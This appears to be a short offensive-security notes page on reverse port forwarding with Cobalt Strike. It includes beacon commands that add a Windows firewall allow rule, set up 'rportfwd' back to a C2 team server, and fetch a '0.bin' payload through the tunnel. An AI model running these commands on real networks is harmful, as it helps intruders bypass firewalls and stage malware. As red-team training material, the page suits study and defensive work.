# Reverse Port Forwarding



## Introduction

Reverse Port Forwarding allows users to access systems behind a firewall from outsiside. It works by redirecting traffic from a remote server's port to a local machine port.

<mark style="color:red;">**NOTE**</mark>: When the Windows firewall is enabled, it will prompt the user with a UAC when an application attempts to listen on a port that is not explicitly allowed.

We must create an allow rule before running the reverse port. forward

## Create Firewall rule

<pre><code><strong>// Create firewall rule
</strong><strong>beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound 
</strong>-Protocol TCP -Action Allow -LocalPort 8080

// Delete firewall rule
beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"
</code></pre>

## Cobalt Strike

Any traffic hitting this port will be tunnelled back to the team server over the C2 channel.

```
beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
```

Using reverse port forward

<pre><code><strong>PS> iwr -Uri http://192.168.1.124:8080/0.bin
</strong>
StatusCode        : 200
</code></pre>
